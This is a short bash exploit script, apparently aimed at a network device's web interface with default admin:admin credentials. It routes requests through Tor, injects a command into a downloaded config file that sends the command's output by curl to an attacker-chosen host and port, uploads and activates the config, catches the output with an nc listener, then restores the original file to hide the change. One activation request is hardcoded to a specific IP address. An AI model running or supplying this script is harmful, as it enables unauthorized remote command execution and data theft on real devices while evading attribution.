echo "Downloading config file..."

torify curl -sk -u admin:admin -H 'Content-Type:' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -X POST $1/downloadip.php -d "lol" -o ip.conf.ini

echo "Add payload to config file.. (curl based you need to set up a listener)"

cp ip.conf.ini ip.conf

echo " " >> ip.conf
echo " " >> ip.conf
echo " " >> ip.conf
echo " " >> ip.conf

echo "curl -X POST http://$3:$4 -d  \"\$($2)\"" >> ip.conf

echo "Send config file..."

torify curl -sk -u admin:admin -H "Expect:" -H "Content-Type: multipart/form-data" -F "uploadedfile=@ip.conf" $1/uploadip.php > /dev/null

echo "Activate config.."

torify curl -sk -u admin:admin https://185.7.66.229/actconf.cgi > /dev/null

echo "Wait 10sec for output.."

timeout 10 nc -lvp $4


echo "Cleaning.." 

cp ip.conf.ini ip.conf

torify curl -sk -u admin:admin -H "Expect:" -H "Content-Type: multipart/form-data" -F "uploadedfile=@ip.conf.ini" $1/uploadip.php > /dev/null
torify curl -sk -u admin:admin $1/actconf.cgi > /dev/null

echo "That's all folks"
